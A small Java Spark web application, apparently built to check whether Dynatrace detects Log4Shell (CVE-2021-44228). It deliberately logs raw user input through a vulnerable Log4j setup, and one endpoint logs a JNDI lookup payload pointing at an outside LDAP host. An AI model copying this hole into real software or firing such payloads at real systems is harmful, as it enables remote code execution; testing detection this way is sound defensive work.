import static spark.Spark.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);

    public static void main(String[] args) {
        ipAddress("0.0.0.0"); // ✅ Esto es obligatorio para acceder desde el host
        port(6060);
        
        get("/", (req, res) -> 
            "<form action='/log' method='get'>" +
            "<input name='input'/>" +
            "<button>Send</button></form>"
        );
        
        get("/log", (req, res) -> {
            String input = req.queryParams("input");
            logger.info(input);  // ✅ Log4j evalúa dinámicamente expresiones como ${jndi:...}
            return "Input logged: " + input;
        });
        
        // Endpoint para probar la vulnerabilidad Log4Shell
        get("/test-vuln", (req, res) -> {
            String payload = "${jndi:ldap://example.com/a}";
            logger.error("Testing vulnerability: " + payload);
            return "Test de vulnerabilidad ejecutado. Revisa Dynatrace para ver si se detectó CVE-2021-44228.";
        });
    }
}



